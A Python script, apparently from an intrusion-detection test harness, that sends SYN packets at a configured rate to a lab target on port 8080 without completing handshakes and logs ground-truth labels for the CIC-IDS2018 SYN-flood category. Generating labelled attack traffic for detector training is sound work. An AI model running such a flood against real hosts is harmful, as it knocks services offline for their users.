"""High-rate SYN packets without completing the TCP handshake.

CIC-IDS2018 category: DoS/DDoS (SYN flood).
Requires NET_RAW/NET_ADMIN capabilities.
"""

from __future__ import annotations

import os
import signal
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.tests.packet_utils import build_syn_packet, send_raw_packet
from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity  # packets per second

    log_path = f"/app/logs/syn_flood_{attacker_ip}.csv"
    print(f"[syn_flood] Target: {target_ip}, Attacker: {attacker_ip}")
    print(f"[syn_flood] Duration: {duration}s, Rate: {intensity} pps")

    if not wait_for_target(target_ip, 8080):
        print("[syn_flood] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="syn_flood") as logger:
        count = 0
        end_time = time.time() + duration
        delay = 1.0 / max(intensity, 1)

        while RUNNING and time.time() < end_time:
            pkt = build_syn_packet(target_ip, 8080, src_ip=attacker_ip)
            send_raw_packet(pkt)
            count += 1
            if count % 100 == 0:
                logger.log(
                    src_ip=attacker_ip,
                    dst_ip=target_ip,
                    dst_port=8080,
                    label="syn_flood",
                    extra=f"count={count}",
                )
            time.sleep(delay)

    print(f"[syn_flood] Completed. Sent {count} SYN packets.")


if __name__ == "__main__":
    main()
